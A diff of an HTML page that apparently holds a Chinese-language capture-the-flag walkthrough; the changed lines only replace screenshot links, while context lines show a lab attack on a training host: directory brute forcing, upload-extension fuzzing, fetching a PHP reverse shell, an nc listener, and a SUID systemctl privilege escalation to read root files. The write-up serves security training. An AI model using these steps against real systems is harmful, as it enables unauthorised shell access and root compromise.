@@ -236,18 +236,18 @@ gobuster dir -u http://10.10.137.247:3333/ -w /usr/share/wordlists/dirbuster/dir
 <p>发现上传页面</p>
 <pre><code>http://10.10.137.247:3333/internal/
 </code></pre>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397430-c9cfe780-7623-11ea-97b4-eeda9f020c25.png" target="_blank"><a href="https://user-images.githubusercontent.com/58038111/78397430-c9cfe780-7623-11ea-97b4-eeda9f020c25.png" target="_blank">
-    <img src="https://user-images.githubusercontent.com/58038111/78397430-c9cfe780-7623-11ea-97b4-eeda9f020c25.png" alt="image" />
+<p><a href="https://user-images.githubusercontent.com/58038111/78397430-c9cfe780-7623-11ea-97b4-eeda9f020c25.png" target="_blank"><a href="https://xeye.io/static/images/20200713150703.png" target="_blank">
+    <img src="https://xeye.io/static/images/20200713150703.png" alt="image" />
 </a></a></p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397469-d7856d00-7623-11ea-8458-b4928f60e1a2.png" target="_blank"><a href="https://user-images.githubusercontent.com/58038111/78397469-d7856d00-7623-11ea-8458-b4928f60e1a2.png" target="_blank">
-    <img src="https://user-images.githubusercontent.com/58038111/78397469-d7856d00-7623-11ea-8458-b4928f60e1a2.png" alt="image" />
+<p><a href="https://user-images.githubusercontent.com/58038111/78397469-d7856d00-7623-11ea-8458-b4928f60e1a2.png" target="_blank"><a href="https://xeye.io/static/images/20200713150719.png" target="_blank">
+    <img src="https://xeye.io/static/images/20200713150719.png" alt="image" />
 </a></a></p>
 <p><strong>0x03 穷举上传文件扩展名</strong></p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397548-03085780-7624-11ea-843e-4af58c7ac5be.png" target="_blank"><a href="https://user-images.githubusercontent.com/58038111/78397548-03085780-7624-11ea-843e-4af58c7ac5be.png" target="_blank">
-    <img src="https://user-images.githubusercontent.com/58038111/78397548-03085780-7624-11ea-843e-4af58c7ac5be.png" alt="image" />
+<p><a href="https://user-images.githubusercontent.com/58038111/78397548-03085780-7624-11ea-843e-4af58c7ac5be.png" target="_blank"><a href="https://xeye.io/static/images/20200713150753.png" target="_blank">
+    <img src="https://xeye.io/static/images/20200713150753.png" alt="image" />
 </a></a></p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397689-3e0a8b00-7624-11ea-8f46-004de1cf9b54.png" target="_blank"><a href="https://user-images.githubusercontent.com/58038111/78397689-3e0a8b00-7624-11ea-8f46-004de1cf9b54.png" target="_blank">
-    <img src="https://user-images.githubusercontent.com/58038111/78397689-3e0a8b00-7624-11ea-8f46-004de1cf9b54.png" alt="image" />
+<p><a href="https://user-images.githubusercontent.com/58038111/78397689-3e0a8b00-7624-11ea-8f46-004de1cf9b54.png" target="_blank"><a href="https://xeye.io/static/images/20200713150803.png" target="_blank">
+    <img src="https://xeye.io/static/images/20200713150803.png" alt="image" />
 </a></a></p>
 <p>设置Content-Type类型为php</p>
 <pre><code>Content-Type: application/x-php
@@ -255,22 +255,22 @@ gobuster dir -u http://10.10.137.247:3333/ -w /usr/share/wordlists/dirbuster/dir
 <p>取消URL默认编码（Payload文件名中的&rdquo;.&ldquo;被URL编码会导致访问失败）</p>
 <pre><code>Burpsuite --&gt; Intruder --&gt; Payloads --&gt; Payload Encoding --&gt; BurpsuitePayload Encoding
 </code></pre>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397736-57abd280-7624-11ea-9864-4834a018a5c5.png" target="_blank"><a href="https://user-images.githubusercontent.com/58038111/78397736-57abd280-7624-11ea-9864-4834a018a5c5.png" target="_blank">
-    <img src="https://user-images.githubusercontent.com/58038111/78397736-57abd280-7624-11ea-9864-4834a018a5c5.png" alt="image" />
+<p><a href="https://user-images.githubusercontent.com/58038111/78397736-57abd280-7624-11ea-9864-4834a018a5c5.png" target="_blank"><a href="https://xeye.io/static/images/20200713150820.png" target="_blank">
+    <img src="https://xeye.io/static/images/20200713150820.png" alt="image" />
 </a></a></p>
 <p>发现可以上传.phhtm</p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397762-61353a80-7624-11ea-80c0-a44063a0a825.png" target="_blank"><a href="https://user-images.githubusercontent.com/58038111/78397762-61353a80-7624-11ea-80c0-a44063a0a825.png" target="_blank">
-    <img src="https://user-images.githubusercontent.com/58038111/78397762-61353a80-7624-11ea-80c0-a44063a0a825.png" alt="image" />
+<p><a href="https://user-images.githubusercontent.com/58038111/78397762-61353a80-7624-11ea-80c0-a44063a0a825.png" target="_blank"><a href="https://xeye.io/static/images/20200713150831.png" target="_blank">
+    <img src="https://xeye.io/static/images/20200713150831.png" alt="image" />
 </a></a></p>
 <h2 id="0x04-上传webshell">0x04 上传Webshell</h2>
 <pre><code>wget https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php -O php-reverse-shell.phtml
 </code></pre>
 <p>反弹IP修改为本机（攻击机）</p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397775-6a260c00-7624-11ea-843c-357f2b05af34.png" target="_blank"><a href="https://user-images.githubusercontent.com/58038111/78397775-6a260c00-7624-11ea-843c-357f2b05af34.png" target="_blank">
-    <img src="https://user-images.githubusercontent.com/58038111/78397775-6a260c00-7624-11ea-843c-357f2b05af34.png" alt="image" />
+<p><a href="https://user-images.githubusercontent.com/58038111/78397775-6a260c00-7624-11ea-843c-357f2b05af34.png" target="_blank"><a href="https://xeye.io/static/images/20200713150844.png" target="_blank">
+    <img src="https://xeye.io/static/images/20200713150844.png" alt="image" />
 </a></a></p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397793-727e4700-7624-11ea-9429-ed2352309dda.png" target="_blank"><a href="https://user-images.githubusercontent.com/58038111/78397793-727e4700-7624-11ea-9429-ed2352309dda.png" target="_blank">
-    <img src="https://user-images.githubusercontent.com/58038111/78397793-727e4700-7624-11ea-9429-ed2352309dda.png" alt="image" />
+<p><a href="https://user-images.githubusercontent.com/58038111/78397793-727e4700-7624-11ea-9429-ed2352309dda.png" target="_blank"><a href="https://xeye.io/static/images/20200713150857.png" target="_blank">
+    <img src="https://xeye.io/static/images/20200713150857.png" alt="image" />
 </a></a></p>
 <h2 id="0x04-反弹shell">0x04 反弹shell</h2>
 <p>本机NC监听1234端口</p>
@@ -280,13 +280,13 @@ gobuster dir -u http://10.10.137.247:3333/ -w /usr/share/wordlists/dirbuster/dir
 <pre><code>$ cat /home/bill/user.txt
 8bd7992fxxxxxxxxxxxxxxxxxxxxxx
 </code></pre>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397841-8aee6180-7624-11ea-9fe0-a51017f5de30.png" target="_blank"><a href="https://user-images.githubusercontent.com/58038111/78397841-8aee6180-7624-11ea-9fe0-a51017f5de30.png" target="_blank">
-    <img src="https://user-images.githubusercontent.com/58038111/78397841-8aee6180-7624-11ea-9fe0-a51017f5de30.png" alt="image" />
+<p><a href="https://user-images.githubusercontent.com/58038111/78397841-8aee6180-7624-11ea-9fe0-a51017f5de30.png" target="_blank"><a href="https://xeye.io/static/images/20200713150908.png" target="_blank">
+    <img src="https://xeye.io/static/images/20200713150908.png" alt="image" />
 </a></a></p>
 <h2 id="0x04-提权">0x04 提权</h2>
 <p>利用SUID提权，搜索所有SUID文件</p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397885-a0638b80-7624-11ea-8dae-c7ca889e8185.png" target="_blank"><a href="https://user-images.githubusercontent.com/58038111/78397885-a0638b80-7624-11ea-8dae-c7ca889e8185.png" target="_blank">
-    <img src="https://user-images.githubusercontent.com/58038111/78397885-a0638b80-7624-11ea-8dae-c7ca889e8185.png" alt="image" />
+<p><a href="https://user-images.githubusercontent.com/58038111/78397885-a0638b80-7624-11ea-8dae-c7ca889e8185.png" target="_blank"><a href="https://xeye.io/static/images/20200713150922.png" target="_blank">
+    <img src="https://xeye.io/static/images/20200713150922.png" alt="image" />
 </a></a></p>
 <pre><code>$ find / -perm -4000 2&gt; /dev/null | xargs ls -lah
 -rwsr-xr-x 1 root   root        31K Jul 12  2016 /bin/fusermount
@@ -316,8 +316,8 @@ gobuster dir -u http://10.10.137.247:3333/ -w /usr/share/wordlists/dirbuster/dir
 -rwsr-xr-x 1 root   root        75K Jul 17 11:22 /usr/lib/squid/pinger
 -rwsr-xr-x 1 root   root        3
 </code></pre>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397938-bd985a00-7624-11ea-8ec2-acb884811b74.png" target="_blank"><a href="https://user-images.githubusercontent.com/58038111/78397938-bd985a00-7624-11ea-8ec2-acb884811b74.png" target="_blank">
-    <img src="https://user-images.githubusercontent.com/58038111/78397938-bd985a00-7624-11ea-8ec2-acb884811b74.png" alt="image" />
+<p><a href="https://user-images.githubusercontent.com/58038111/78397938-bd985a00-7624-11ea-8ec2-acb884811b74.png" target="_blank"><a href="https://xeye.io/static/images/20200713150936.png" target="_blank">
+    <img src="https://xeye.io/static/images/20200713150936.png" alt="image" />
 </a></a></p>
 <p>我们看到靶机系统允许所有登陆用户创建系统服务并以root权限运行，systemctl用于控制systemd初始化服务的工具。</p>
 <pre><code>xxx=$(mktemp).service 
@@ -338,8 +338,8 @@ cat /tmp/output
 a58ffxxxxxxxxxxxxxxxxxxx
 //获得root flag
 </code></pre>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397966-d0ab2a00-7624-11ea-8767-ea046bc138e5.png" target="_blank"><a href="https://user-images.githubusercontent.com/58038111/78397966-d0ab2a00-7624-11ea-8767-ea046bc138e5.png" target="_blank">
-    <img src="https://user-images.githubusercontent.com/58038111/78397966-d0ab2a00-7624-11ea-8767-ea046bc138e5.png" alt="image" />
+<p><a href="https://user-images.githubusercontent.com/58038111/78397966-d0ab2a00-7624-11ea-8767-ea046bc138e5.png" target="_blank"><a href="https://xeye.io/static/images/20200713150947.png" target="_blank">
+    <img src="https://xeye.io/static/images/20200713150947.png" alt="image" />
 </a></a></p>
 <p>systemctl提权参考GTFOBins项目文章：https://gtfobins.github.io/gtfobins/systemctl/#suid</p>
 
